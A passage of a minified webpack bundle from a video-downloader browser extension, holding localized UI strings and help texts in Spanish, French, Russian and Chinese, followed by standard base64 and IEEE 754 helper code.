videos pequeños al formato correcto en línea. En algunos casos, el convertidor consume muchos recursos del ordenador."},{"title":"¿Por qué no puedo descargar el video en formato elegido directamente?","article":"Archivos con algunos formatos no se puede descargar directamente por las propiedades técnicas de {%onlineVideoPlatform%}. Por lo tanto, el <b>{%extensionName%}</b> tiene una función adicional para convertir videos cortos en el formato deseado en línea . Los videos grandes (largos y/o en alta calidad) requieren demasiados recursos para la conversión en línea y a veces provocan un bloqueo del navegador/ordenador. Por eso, se ofrece descargarlos con <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} para Windows</a></b>."},{"title":"¿Cómo puedo obtener un enlace de descarga de video/audio?","article":"Enlace de descarga directa está disponible solo para aquellos formatos que no requieren conversión. Para obtener el enlace, haga clic en el ícono &nbsp;\x3c!--[img-copy]--\x3e de la línea con la opción de descarga adecuada. Luego pegue el enlace como texto donde sea necesario."},{"title":"¿Cómo descargar un video con 60 fps?","article":"Es suficiente con elegir la opción de descarga correspondiente, marcada con el ícono&nbsp;\x3c!--[img-fps-60]--\x3e. Sin embargo, esta opción no siempre está disponible. E vídeo original en sí debe tener el frame rate de al menos 60 FPS y estar disponible para ver en el reproductor. {%onlineVideoPlatform%} con 60 FPS."},{"title":"¿Cómo descargar una pista de audio (música) en MP3?","article":"Por desgracia, actualmente no es posible descargar MP3 directamente. No es compatible con {%onlineVideoPlatform%}, y la conversión en línea es inestable. Puede utilizar el <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} para Windows</a></b> que admite la conversión de video a formato MP3. O seleccione un formato de audio alternativo de la lista (ícono&nbsp;\x3c!--[img-sound-on]--\x3e).","services":[]},{"title":"¿Cómo hacer una captura de pantalla?","article":"Asegúrese de que en los <a data-webext-page=\\"settings\\">ajustes</a> está marcado <b>\\"Mostrar el botón de instantánea\\"</b>. En la esquina inferior derecha del reproductor, al lado izquierdo del ícono <b>\\"Ajustes\\"</b> aparecerá el ícono&nbsp;\x3c!--[img-camera]--\x3e. SI hace clic en el ícono, la captura de pantalla se guardará en su ordenador en formato jpeg.","services":["gv","ok"]},{"title":"¿Cómo mostrar la interfaz al pulsar el botón de descarga y no al pasar el cursor por encima?","article":"Puede elegir el diseño del botón en los <a data-webext-page=\\"settings\\">ajustes</a>: <ul><li><b>moderno</b> (la interfaz aparece al pasar el cursor por encima)</li><li><b>clásico</b> (la interfaz aparece al pulsar el botón)</li></ul>"},{"title":"¿Para qué son los códigos QR?","article":"Al utilizar códigos QR, se puede obtener un enlace directo a video o audio en cualquier dispositivo con cámara. Asegúrese de que el botón <b>“Mostrar códigos QR”</b> está habilitado en los <a data-webext-page=\\"settings\\">ajustes de {%extensionName%}</a>. Algunas opciones de descarga tendrán el ícono &nbsp;\x3c!--[img-qr-code]--\x3e. Si hace clic en el ícono, verá un código QR y las instrucciones para su móvil o tablet.","services":["gv","gvOk"]}],"qr_code_title":"Código QR para celular","qr_code_description":"Es fácil enviar el enlace de descarga directa a su móvil o tablet — solo tiene que abrir un lector  de códigos QR y escanear la imagen de arriba.","qr_code_error":"El servicio de código QR no está disponible temporalmente. Inténtelo de nuevo más tarde.","show_yandex_market_adviser":"Mostrar asesor Yandex.Market - comparador de precios y ofertas","warning":"¡Aviso!","yandex_market_adviser_notification_description":"Los cambios surtirán efecto al reiniciar la página con el widget Yandex.Market.","social_media_sharing":{"title":"¡Atención, por favor!","mediafile":"mediafile","mediafile_plural":"mediafiles","already_oneMediafile":"","already_moreThanOneMediafile":"ya","message":"<0>Con nuestra extensión de navegador usted {{already}} descargó <3><0>{{downloadsCount}}</0></3> $t(social_media_sharing.mediafile) :)</0><1>Para que {{extensionName}} siga siendo gratis, necesitamos su ayuda – cuente de nosotros en redes sociales o aplicaciones de mensajería!</1>","button_ok":"Compartir con amigos","button_cancel":"Ahora no"},"direct_links_unavailable":"Los enlaces directos no están disponibles temporalmente. Intente <a data-webext-function=\\"reload\\">reiniciar la página </a> (tecla F5)","day":"d","hour":"h","minute":"min","second":"seg"}'
        );
    },
    function (module) {
        module.exports = JSON.parse(
            '{"language":"Langage","auto_detect":"Détection Automatique","download":"Télécharger","live_stream":"Flux en Direct","live_stream_tooltip":"Vous ne pouvez pas encore télécharger les Diffusions en Direct, mais nous y travaillons :)","premiere":"Première","premiere_tooltip":"Il n\'y a encore rien à télécharger :)","return_to_the_previous_screen":"Précédent","settings":{"title":"Paramètres","show_formats_available_via_desktop_client":"Afficher les formats disponibles via {{desktopClientName}}","show_formats_required_online_conversion":"Afficher les formats nécessitant une conversion en ligne","show_webm":"Afficher la vidéo au format WebM","show_snapshot_button":"Afficher le bouton de capture d\'instantanés de vidéo","warn_before_converting":"Avertir avant de convertir","title_app_button_style":"Style de bouton","app_button_style_modern":"Moderne (l\'interface apparaît au survol de la souris)","app_button_style_classic":"Classique (l\'interface apparaît au clic)","display_qr_codes":"Afficher les QR codes"},"confirm_conversion_title":"Le format de fichier choisi nécessite une conversion!","confirm_conversion_message":"La conversion utilise activement les ressources matérielles, ce qui peut devenir la raison d\'une diminution temporaire de la vitesse du navigateur, y compris dans les autres onglets.","do_not_show_on_load":"Ne pas afficher au chargement","cancel":"Annuler","continue":"Continuer","formats_for_download":"Formats pour télécharger","all_formats_for_download":"Tous les formats pour le téléchargement","more_formats":"Plus de formats","conversion_required":"besoin d\'une conversion","conversion_time":"conversion ~{%conversionTime%}","download_via_web_portal":"Télécharger le format requis via {{webPortalHostname}}","download_via_web_portal_tooltip":"Télécharger via {{webPortalHostname}}","download_using_desktop_client":"Télécharger le format requis en utilisant {{desktopClientName}}","download_using_desktop_client_tooltip":"Télécharger en utilisant {{desktopClientName}}","qr_code_tooltip":"Obtenir le QR Code","copy_link_to_clipboard_tooltip":"Copier le lien","copy_link_to_clipboard_notification_message":"Le lien est copié dans le presse-papiers","active_download_warning_notification_message":"Tout est sous contrôle !","active_download_warning_notification_description":"Vous avez quitté la page avec un téléchargement actif, il se poursuivra en arrière-plan.","cancel_download":"Annuler le téléchargement/la conversion","take_screenshot_tooltip":"Effectuer une capture d\'écran","drop_us_a_line":"Vous n\'avez pas trouvé de réponse ? Envoyez-nous un message ;)","help":"Aide","help_articles":[{"title":"Comment télécharger ?","article":"Vous pouvez télécharger le format par défaut en cliquant sur le bouton <b>{%extensionName%}</b> sous la vidéo. Vous pouvez également choisir le format souhaité dans la liste déroulante."},{"title":"Quel format vidéo dois-je choisir ?","article":"La meilleure qualité est disponible dans <b>FullHD (1080p)</b>, <b>2K (1440p)</b>, <b>4K (2160p)</b> et <b>8K (4320p)</b>. La recommandation générale est que plus la résolution de votre écran est élevée, plus la qualité de la vidéo devrait être bonne. Toutefois, vous devez également tenir compte d\'autres facteurs : la vitesse de téléchargement, quantité d\'espace libre et performances de l\'appareil pendant la lecture."},{"title":"Pourquoi un navigateur/ordinateur se bloque-t-il pendant le téléchargement ?","article":"Le navigateur/ordinateur ne doit pas se figer complètement ! Si cela s\'est produit, veuillez le signaler via le formulaire de commentaires, en indiquant le lien vers la vidéo. Malheureusement, certains formats vidéo ne peuvent pas être téléchargés de {%onlineVideoPlatform%} directement. C\'est pourquoi nous avons ajouté la possibilité de convertir les petites vidéos en format souhaité dans <b>{%extensionName%}</b> en ligne. Dans certains cas, ce processus utilise les ressources de l\'ordinateur trop activement."},{"title":"Pourquoi je ne peux pas télécharger une vidéo directement dans le format souhaité ?","article":"Certains formats de fichiers vidéo ne peuvent pas être téléchargés directement en raison de certaines propriétés techniques de {%onlineVideoPlatform%}. Par conséquent, le <b>{%extensionName%}</b> a une fonctionnalité supplémentaire pour convertir les vidéos courtes dans le format souhaité en ligne.Les large vidéos (plus longues et/ou de haute qualité) nécessitent de nombreuses ressources pour la conversion en ligne, ce que peut parfois geler votre navigateur/ordinateur. Donc on est suggéré de télécharger telles vidéos en utilisant le <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} pour Windows</a></b>."},{"title":"Comment puis-je obtenir un lien de téléchargement de vidéo/audio ?","article":"Le lien de téléchargement direct est disponible pour les formats qui ne nécessitent pas de conversion.Pour ce faire, cliquez sur l\'icône&nbsp;\x3c!--[img-copy]--\x3e dans une ligne avec l\'option de téléchargement appropriée, puis collez-la comme texte là où c\'est nécessaire."},{"title":"Comment télécharger une vidéo en 60 fps ?","article":"Il suffit de choisir l\'option de téléchargement correspondante, qui peut être identifiée par l\'icône&nbsp;\x3c!--[img-fps-60]--\x3e. Toutefois, ces options ne sont pas toujours disponibles. Surtout, la vidéo originale doit avoir au moins 60 FPS. En plus, elle doit pouvoir être visionné dans le lecteur de {%onlineVideoPlatform%} à 60 FPS."},{"title":"Comment télécharger une piste audio (musique) en MP3 ?","article":"Malheureusement, ce n\'est pas possible de télécharger directement le format MP3 pour le moment. {%onlineVideoPlatform%} ne le prend pas en charge, et la conversion en ligne nécessaire est instable. Utilisez notre <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} pour Windows</a></b>, qui peut convertir des fichiers vidéo en MP3. Ou sélectionnez l\'un des autre formats audio dans la liste (indiqué par l\'icône&nbsp;\x3c!--[img-sound-on]--\x3e)."},{"title":"Comment faire une capture d\'écran ?","article":"Assurez-vous que dans les <a data-webext-page=\\"settings\\">paramètres</a> il y a une case à cocher en face de l\'élément <b>\\"Afficher le bouton de capture le vidéo\\"</b>. Dans le coin inférieur droit du lecteur, à gauche de l\'icône <b>\\"Paramètres\\"</b> l\'icône <b>\\"Prendre une capture d\'écran\\"</b>&nbsp;\x3c!--[img-camera]--\x3e devrait apparaître, en cliquant dessus, l\'image actuelle de la vidéo sera enregistrée sur votre ordinateur au format jpeg.","services":["gv","ok"]},{"title":"Comment afficher l\'interface en cliquant sur le bouton de téléchargement et non en le survolant ?","article":"Vous pouvez choisir un style de bouton dans les <a data-webext-page=\\"settings\\">paramètres</a> : <ul><li><b>moderne</b> (l\'interface apparaît au pointé la souris)</li><li><b>classique</b> (l\'interface apparaît au clic)</li></ul>"},{"title":"Pourquoi avez-vous besoin de codes QR ?","article":"En utilisant des codes QR, vous pouvez obtenir un lien direct vers une vidéo ou un fichier audio sur tout appareil doté d\'une caméra. Assurez-vous quel\'élément <b>\\"Afficher les codes QR\\"</b> est activé dans les paramètres <a data-webext-page=\\"settings\\">de {%extensionName%}</a> . Certaines options de téléchargement comporteront une \\"Obtenir un code QR\\" icône&nbsp;\x3c!--[img-qr-code]--\x3e, en cliquant sur lequel vous verrez un code QR et des instructions pour votre téléphone ou votre tablette.","services":["gv","gvOk"]}],"qr_code_title":"Code QR pour appareil mobile","qr_code_description":"C\'est facile d\'envoyer le lien de téléchargement direct sur votre smartphone ou votre tablette - c\'est que lancer le scanner de code QR et le survoler l\'image ci-dessus.","qr_code_error":"Le service de code QR n\'est pas disponible pour le moment. Veuillez réessayer plus tard.","show_yandex_market_adviser":"Afficher Yandex.Market Adviser - widget de comparaison de prix des meilleures offres","warning":"Attention !","yandex_market_adviser_notification_description":"Les changements prendront effet après le rechargement de la page avec le widget Yandex.Advisor.","social_media_sharing":{"title":"Un moment s\'il vous plaît !","mediafile":"multimédia","mediafile_plural":"multimédias","already_oneMediafile":"","already_moreThanOneMediafile":"déjà","message":"<0>Avec notre extension de navigateur, vous avez {{already}}téléchargé <3><0>{{downloadsCount}}</0></3> $t(social_media_sharing.mediafile) :)</0><1>Pour que {{extensionName}}reste gratuit, nous avons besoin de votre aide - parlez de nous sur les réseaux sociaux ou les messageries !</1>","button_ok":"Partager avec des amis","button_cancel":"Annuler, pas maintenant","help_extension_to_get_better":"Aidez-nous à améliorer {{extensionName}} !"},"direct_links_unavailable":"Les liens directs sont temporairement indisponibles. Essayez de <a data-webext-function=\\"reload\\">recharger la page</a> (La touche de fonction F5)","day":"j","hour":"h","minute":"min","second":"sec"}'
        );
    },
    function (module) {
        module.exports = JSON.parse(
            '{"language":"Язык","auto_detect":"Автоопределение","download":"Скачать","live_stream":"Трансляция","live_stream_tooltip":"Трансляции скачивать ещё нельзя, но мы уже работаем над этим :)","premiere":"Премьера","premiere_tooltip":"Пока что нечего скачивать :)","return_to_the_previous_screen":"Назад","settings":{"title":"Настройки","show_formats_available_via_desktop_client":"Отображать форматы, доступные через {{desktopClientName}}","show_formats_required_online_conversion":"Отображать форматы, требующие онлайн-конвертации","show_webm":"Отображать видео в формате WebM","show_snapshot_button":"Отображать кнопку сохранения скриншота из видео","warn_before_converting":"Предупреждать при конвертации","title_app_button_style":"Внешний вид кнопки","app_button_style_modern":"Современный (интерфейс выводится при наведении)","app_button_style_classic":"Классический (интерфейс выводится при клике)","display_qr_codes":"Отображать QR-коды"},"confirm_conversion_title":"Выбранный формат файла требует конвертации!","confirm_conversion_message":"Конвертация активно использует ресурсы компьютера, что может вызвать временное снижение скорости работы браузера, в том числе и в других вкладках.","do_not_show_on_load":"Не показывать при загрузке","cancel":"Отмена","continue":"Продолжить","formats_for_download":"Варианты загрузки","all_formats_for_download":"Все доступные форматы","more_formats":"Больше форматов","conversion_required":"нужна конвертация","conversion_time":"конвертация ~{%conversionTime%}","download_via_web_portal":"Скачать в нужном формате через {{webPortalHostname}}","download_via_web_portal_tooltip":"Скачать через {{webPortalHostname}}","download_using_desktop_client":"Скачать в нужном формате через {{desktopClientName}}","download_using_desktop_client_tooltip":"Cкачать c помощью {{desktopClientName}}","qr_code_tooltip":"Получить QR-код","copy_link_to_clipboard_tooltip":"Копировать ссылку","copy_link_to_clipboard_notification_message":"Ссылка скопирована в буфер обмена","active_download_warning_notification_message":"Всё под контролем!","active_download_warning_notification_description":"Вы ушли со страницы с активным скачиванием, оно продолжится в фоновом режиме.","cancel_download":"Прекратить скачивание/конвертацию","take_screenshot_tooltip":"Сохранить кадр","drop_us_a_line":"Не нашли ответа? Напишите нам ;)","help":"Помощь","help_articles":[{"title":"Как здесь качать?","article":"Вы можете использовать формат по умолчанию, просто нажав по кнопке <b>{%extensionName%}</b> под видео. Или кликните на нужный формат в списке доступных для скачивания."},{"title":"Какой формат видео выбрать?","article":"Наилучшее качество имеют форматы <b>FullHD (1080p)</b>, <b>2K (1440p)</b>, <b>4K (2160p)</b> и <b>8K (4320p)</b>. Общая рекомендация состоит в том, что чем больше разрешение вашего экрана, тем лучше должно быть качество видео. Однако вам следует учесть и другие факторы: скорость скачивания, количество свободного места, а также производительность устройства при проигрывании."},{"title":"Почему браузер/компьютер зависает при загрузке?","article":"Полностью зависать браузер/компьютер не должен! Если это произошло, просьба сообщить об этом через форму обратной связи, указав ссылку на видео. К сожалению, видео в некоторых форматах нельзя скачать с {%onlineVideoPlatform%} напрямую. Поэтому мы добавили в <b>{%extensionName%}</b> возможность онлайн-конвертации небольших видео в нужный формат. В отдельных случаях этот процесс слишком активно использует ресурсы компьютера."},{"title":"Почему я не могу скачать видео в нужном формате напрямую?","article":"В силу технических особенностей {%onlineVideoPlatform%}, видео в некоторых форматах нельзя скачать напрямую. Поэтому в <b>{%extensionName%}</b> добавлена возможность онлайн-конвертации небольших видео в нужный формат. Большие видео (продолжительные и/или высокого качества) требуют для онлайн-конвертации слишком много ресурсов, что порой приводит к зависанию браузера/компьютера. Поэтому их предлагается скачивать через <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} для Windows</a></b>."},{"title":"Как получить ссылку на видео/аудио?","article":"Прямая ссылка на файл доступна только для форматов, которые не требуют конвертации. Для этого нажмите на иконку&nbsp;\x3c!--[img-copy]--\x3e в строке с подходящим вариантом скачивания. А затем вставьте её в виде текста туда, где необходимо."},{"title":"Как скачать видео с 60 FPS?","article":"Достаточно выбрать соответствующий вариант скачивания — определить его можно по иконке&nbsp;\x3c!--[img-fps-60]--\x3e. Однако не всегда такие варианты имеются. Прежде всего, само исходное видео должно иметь частоту кадров не меньше, чем 60. И оно должно быть доступно к просмотру в плеере {%onlineVideoPlatform%} с 60 FPS."},{"title":"Как скачать аудиодорожку (музыку) в MP3?","article":"К сожалению, в данный момент нельзя скачать в формате MP3 напрямую — {%onlineVideoPlatform%} его не поддерживает, а необходимая онлайн-конвертация работает нестабильно. Воспользуйтесь нашим <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} для Windows</a></b>, который поддерживает конвертацию видео в формат MP3. Или выберите в списке один из альтернативных аудиоформатов (обозначены иконкой&nbsp;\x3c!--[img-sound-on]--\x3e).","services":[]},{"title":"Как сохранить кадр из видео?","article":"Убедитесь, что в <a data-webext-page=\\"settings\\">настройках</a> отмечен пункт <b>«Отображать кнопку сохранения скриншота из видео»</b>. В правом нижнем углу плеера левее иконки <b>«Настройки»</b> должна появиться иконка&nbsp;\x3c!--[img-camera]--\x3e, по нажатию на которую текущий кадр из видео будет сохранён на ваш компьютер в формате jpeg.","services":["gv","ok"]},{"title":"Как отображать интерфейс по клику на кнопку скачивания, а не при наведении на неё?","article":"В <a data-webext-page=\\"settings\\">настройках</a> вы можете выбрать внешний вид кнопки: <ul><li><b>современный</b> (интерфейс выводится при наведении)</li><li><b>классический</b> (интерфейс выводится при клике)</li></ul>"},{"title":"Зачем нужны QR-коды?","article":"С помощью QR-кодов вы можете получить прямую ссылку на видео или аудио на любом устройстве с камерой. Убедитесь, что в <a data-webext-page=\\"settings\\">настройках {%extensionName%}</a> включен пункт <b>«Отображать QR-коды»</b>. У некоторых вариантов загрузки появится иконка&nbsp;\x3c!--[img-qr-code]--\x3e, по нажатию на которую вы увидите QR-код и инструкцию для телефона или планшета.","services":["gv","gvOk"]}],"qr_code_title":"QR-код для мобильного устройства","qr_code_description":"Передать прямую ссылку для загрузки на ваш смартфон или планшет теперь просто — запустите сканер QR-кодов и наведите на изображение выше.","qr_code_error":"Сервис QR-кодов сейчас недоступен. Пожалуйста, попробуйте позже.","show_yandex_market_adviser":"Отображать Яндекс.Советник — виджет сравнения цен для выгодных покупок","warning":"Внимание!","yandex_market_adviser_notification_description":"Изменения вступят в силу после перезагрузки страницы с виджетом Яндекс.Советника.","social_media_sharing":{"title":"Минуточку внимания!","mediafile_0":"медиафайл","mediafile_1":"медиафайла","mediafile_2":"медиафайлов","already_oneMediafile":"","already_moreThanOneMediafile":"уже","message":"<0>С помощью нашего браузерного расширения вы загрузили {{already}} <3><0>{{downloadsCount}}</0></3> $t(social_media_sharing.mediafile) :)</0><1>Для того, чтобы {{extensionName}} оставался бесплатным, нам нужна ваша помощь — расскажите о нас в социальных сетях или месенджерах!</1>","button_ok":"Поделиться с друзьями","button_cancel":"Мне сложно это сделать сейчас","asking_for_review_by_downloads":"Вы успешно скачали {{downloadsCount}} $t(social_media_sharing.mediafile).<5 /> Будем благодарны за отзыв и <7>5 звёздочек</7> ;)<9 />Это действительно важно для развития.","screenshot_0":"скриншот","screenshot_1":"скриншота","screenshot_2":"скриншотов","asking_for_review_by_screenshots":"Вы успешно сделали {{screenshotsCount}} $t(social_media_sharing.screenshot).<5 /> Будем благодарны за отзыв и <7>5 звёздочек</7> ;)<9 />Это действительно важно для развития.","button_cancel_rate":"Не сейчас","button_rate":"Оценить","help_extension_to_get_better":"Помогите {{extensionName}} стать лучше!"},"direct_links_unavailable":"Прямые ссылки временно недоступны. Попробуйте <a data-webext-function=\\"reload\\">перезагрузить страницу</a> (клавиша F5)","day":"д","hour":"ч","minute":"мин","second":"сек","reset":"Сбросить","download_error":"Во время последней загрузки файла произошла ошибка. Для возврата к списку форматов загрузки нажмите на кнопку «Сбросить»."}'
        );
    },
    function (module) {
        module.exports = JSON.parse(
            '{"language":"语言","auto_detect":"自动检测","download":"下载","live_stream":"流直播","live_stream_tooltip":"你还不能下载流直播，但我们正在努力 :)","premiere":"首播","premiere_tooltip":"还没有什么可以下载的 :)","return_to_the_previous_screen":"上一页","settings":{"title":"设置","show_formats_available_via_desktop_client":"显示格式可使用通过 {{desktopClientName}}","show_formats_required_online_conversion":"显示需要在线转换的格式","show_webm":"显示以 WebM 格式的视频","show_snapshot_button":"显示视频截图按键","warn_before_converting":"转换前警告","title_app_button_style":"按键样式","app_button_style_modern":"现代（界面是通过鼠标悬停出现的）","app_button_style_classic":"经典（界面是在点击出现的）","display_qr_codes":"显示二维码"},"confirm_conversion_title":"选择的文件格式需要转换！","confirm_conversion_message":"转换使用硬件资源，这能导致暂时下降浏览器的速度，包括在其他标签中。","do_not_show_on_load":"加载时不要显示出来","cancel":"取消","continue":"继续","formats_for_download":"下载格式","all_formats_for_download":"所有下载格式","more_formats":"更多格式","conversion_required":"需要转换","conversion_time":"转换 ~{%conversionTime%}","download_via_web_portal":"通过 {{webPortalHostname]} 下载所需的格式","download_via_web_portal_tooltip":"通过 {{webPortalHostname}} 下载","download_using_desktop_client":"使用 {{desktopClientName}} 下载所需的格式","download_using_desktop_client_tooltip":"使用 {{desktopClientName}} 下载","qr_code_tooltip":"获取二维码","copy_link_to_clipboard_tooltip":"复制链接到剪贴板","copy_link_to_clipboard_notification_message":"将链接复制了到剪贴板","active_download_warning_notification_message":"一切按计划进行！","active_download_warning_notification_description":"您已离开活动下载的页面，它将在后台继续。","cancel_download":"取消下载/转换","take_screenshot_tooltip":"截图","drop_us_a_line":"没有找到答案？ 给我们留言 ;)","help":"帮助","help_articles":[{"title":"如何下载？","article":"您通过点击视频下方的 <b>{%extensionName%}</b> 按键能下载默认格式。还您可以在下拉列表中选择所需的格式。"},{"title":"我应该选择哪种视频格式？","article":"最高品质有下面的格式： <b>FullHD (1080p)</b>, <b>2K (1440p)</b>, <b>4K (2160p)</b> и <b>8K (4320p)</b>。一般建议是屏幕分辨率越高，就视频质量您需要好。 但是，您还要注意其他因素：下载速度、可用空间量以及机器设备性能。"},{"title":"为什么下载时浏览器/电脑会卡机？","article":"浏览器/电脑不应死机！如果发生这种情况，请通过反馈表跟我们留言，并注明视频链接。正可惜，某些视频格式无法直接从 {%onlineVideoPlatform%} 下载。因此，我们在 <b>{%extensionName%}</b> 中添加了可能性将小视频在线转换为所需格式。在某些情况下，此过程积极地使用电脑资源。"},{"title":"为什么我不能直接下载所需格式的视频？","article":"由于 {%onlineVideoPlatform%} 的某些技术特性，有些视频文件格式无法直接下载。因此，<b>{%extensionName%}</b> 有在线转换视频为所需格式的附加功能。大型视频（更长和/或最高清的）需要许多资源为在线转换，这有时会卡机您的浏览器/电脑。因此，建议通过 <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} 对 Windows</a></b> 下载这种的视频。"},{"title":"如何我能获得视频/音频下载链接？","article":"直接下载链接才适用于不需要转换的格式。 为此，请单击在适当下载选项的行中的图标&nbsp;\x3c!--[img-copy]--\x3e，然后在必要粘贴为文本。"},{"title":"如何下载 60帧的视频？","article":"选择相应的下载选项就行了，能识别通过图标&nbsp;\x3c!--[img-fps-60]--\x3e。 然而，这种选择并不总是可用的。首先，原始视频必须至少有 60帧的帧数。此外，它必须可以在{%onlineVideoPlatform%}播放器中以60帧速率观看。"},{"title":"如何下载MP3格式的音轨（音乐）？","article":"不幸的是，目前不可能直接下载MP3格式。{%onlineVideoPlatform%}不支持，而且所需的在线转换也不稳定。 使用我们的 <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} 为 Windows</a></b>，可以将视频文件转换为 MP3。或者从列表中选择任何其他音频格式（用图标&nbsp;\x3c!--[img-sound-on]->表示）。"},{"title":"如何进行屏幕截图？","article":"确保在<a data-webext-page=\\"settings\\">设置</a>中，在<b>\\"显示视频截图按键\\"</b>对面有一个复选框。在播放器右下角的<b>“设置”</b>图标左侧，应该出现<b>\\"截图\\"</b>图标&nbsp;\x3c!--[img-camera]--\x3e，通过单击它，视频中的当前帧将以jpeg格式保存到您的电脑上。","services":["gv","ok"]},{"title":"如何能在下载按键单击显示界面，而不是在悬停它上面？","article":"您可以在 <a data-webext-page=\\"settings\\">设置</a> 中选择一种按键风格：<ul><li><b>现代</b>（界面在鼠标悬停出现）</li ><li><b>经典</b>（界面在点击出现）</li></ul>"},{"title":"为什么您需要二维码？","article":"使用二维码，您可以在任何有照相机的设备上获得视频或音频的直接链接。 确保在<a data-webext-page=\\"settings\\">{%extensionName%}设置</a>中<b>“显示二维码”</b>项目是启用的。有些下载选项会有一个 \\"获取QR码 \\"的图标&nbsp;\x3c!--[img-qr-code]--\x3e，点击后您会看到一个二维码和为手机或平板电脑的说明。","services":["gv","gvOk"]}],"qr_code_title":"移动设备使用的二维码","qr_code_description":"将直接的下载链接发送到您的智能手机或平板电脑上很容易—只需将二维码扫描器启动而悬停在上面的图片上。","qr_code_error":"二维码服务暂时无法使用。请稍后再试。","show_yandex_market_adviser":"显示Yandex.Market Adviser - 是比较最优惠价格的小部件","warning":"注意！","yandex_market_adviser_notification_description":"这些变化将在重新加载Yandex.Market Adviser小部件页面后生效。","social_media_sharing":{"title":"请稍等片刻！","already_oneMediafile":"","already_moreThanOneMediafile":"已经","message":"<0>通过我们的浏览器扩展，您{{already}}下载了<3><0>{{downloadsCount}}</0></3> 视频 :)</0><1>为了保持{{extensionName}}的免费性，我们需要您的帮助—在社交网络或信使上介绍我们吧!</1>","button_ok":"与朋友分享","button_cancel":"不是现在","help_extension_to_get_better":"帮助{{extensionName}}变得更好！"},"direct_links_unavailable":"直接的链接暂时不可用。 尝试<a data-webext-function=\\"reload\\">重新加载页面</a>（F5 键）","day":"天","hour":"小时","minute":"分钟","second":"秒"}'
        );
    },
    function (module, exports, __webpack_require__) {
        module.exports = __webpack_require__(295);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (exports.byteLength = function (b64) {
            var lens = getLens(b64),
                validLen = lens[0],
                placeHoldersLen = lens[1];
            return (3 * (validLen + placeHoldersLen)) / 4 - placeHoldersLen;
        }),
            (exports.toByteArray = function (b64) {
                var tmp,
                    i,
                    lens = getLens(b64),
                    validLen = lens[0],
                    placeHoldersLen = lens[1],
                    arr = new Arr(
                        (function (b64, validLen, placeHoldersLen) {
                            return (3 * (validLen + placeHoldersLen)) / 4 - placeHoldersLen;
                        })(0, validLen, placeHoldersLen)
                    ),
                    curByte = 0,
                    len = placeHoldersLen > 0 ? validLen - 4 : validLen;
                for (i = 0; i < len; i += 4)
                    (tmp = (revLookup[b64.charCodeAt(i)] << 18) | (revLookup[b64.charCodeAt(i + 1)] << 12) | (revLookup[b64.charCodeAt(i + 2)] << 6) | revLookup[b64.charCodeAt(i + 3)]),
                        (arr[curByte++] = (tmp >> 16) & 255),
                        (arr[curByte++] = (tmp >> 8) & 255),
                        (arr[curByte++] = 255 & tmp);
                2 === placeHoldersLen && ((tmp = (revLookup[b64.charCodeAt(i)] << 2) | (revLookup[b64.charCodeAt(i + 1)] >> 4)), (arr[curByte++] = 255 & tmp));
                1 === placeHoldersLen && ((tmp = (revLookup[b64.charCodeAt(i)] << 10) | (revLookup[b64.charCodeAt(i + 1)] << 4) | (revLookup[b64.charCodeAt(i + 2)] >> 2)), (arr[curByte++] = (tmp >> 8) & 255), (arr[curByte++] = 255 & tmp));
                return arr;
            }),
            (exports.fromByteArray = function (uint8) {
                for (var tmp, len = uint8.length, extraBytes = len % 3, parts = [], i = 0, len2 = len - extraBytes; i < len2; i += 16383) parts.push(encodeChunk(uint8, i, i + 16383 > len2 ? len2 : i + 16383));
                1 === extraBytes
                    ? ((tmp = uint8[len - 1]), parts.push(lookup[tmp >> 2] + lookup[(tmp << 4) & 63] + "=="))
                    : 2 === extraBytes && ((tmp = (uint8[len - 2] << 8) + uint8[len - 1]), parts.push(lookup[tmp >> 10] + lookup[(tmp >> 4) & 63] + lookup[(tmp << 2) & 63] + "="));
                return parts.join("");
            });
        for (var lookup = [], revLookup = [], Arr = "undefined" != typeof Uint8Array ? Uint8Array : Array, code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", i = 0, len = code.length; i < len; ++i)
            (lookup[i] = code[i]), (revLookup[code.charCodeAt(i)] = i);
        function getLens(b64) {
            var len = b64.length;
            if (len % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
            var validLen = b64.indexOf("=");
            return -1 === validLen && (validLen = len), [validLen, validLen === len ? 0 : 4 - (validLen % 4)];
        }
        function encodeChunk(uint8, start, end) {
            for (var tmp, num, output = [], i = start; i < end; i += 3)
                (tmp = ((uint8[i] << 16) & 16711680) + ((uint8[i + 1] << 8) & 65280) + (255 & uint8[i + 2])), output.push(lookup[((num = tmp) >> 18) & 63] + lookup[(num >> 12) & 63] + lookup[(num >> 6) & 63] + lookup[63 & num]);
            return output.join("");
        }
        (revLookup["-".charCodeAt(0)] = 62), (revLookup["_".charCodeAt(0)] = 63);
    },
    function (module, exports) {
        (exports.read = function (buffer, offset, isLE, mLen, nBytes) {
            var e,
                m,
                eLen = 8 * nBytes - mLen - 1,
                eMax = (1 << eLen) - 1,
                eBias = eMax >> 1,
                nBits = -7,
                i = isLE ? nBytes - 1 : 0,
                d = isLE ? -1 : 1,
                s = buffer[offset + i];
            for (i += d, e = s & ((1 << -nBits) - 1), s >>= -nBits, nBits += eLen; nBits > 0; e = 256 * e + buffer[offset + i], i += d, nBits -= 8);
            for (m = e & ((1 << -nBits) - 1), e >>= -nBits, nBits += mLen; nBits > 0; m = 256 * m + buffer[offset + i], i += d, nBits -= 8);
            if (0 === e) e = 1 - eBias;
            else {
                if (e === eMax) return m ? NaN : (1 / 0) * (s ? -1 : 1);
                (m += Math.pow(2, mLen)), (e -= eBias);
            }
            return (s ? -1 : 1) * m * Math.pow(2, e - mLen);
        }),
            (exports.write = function (buffer, value, offset, isLE, mLen, nBytes) {
                var e,
                    m,
                    c,
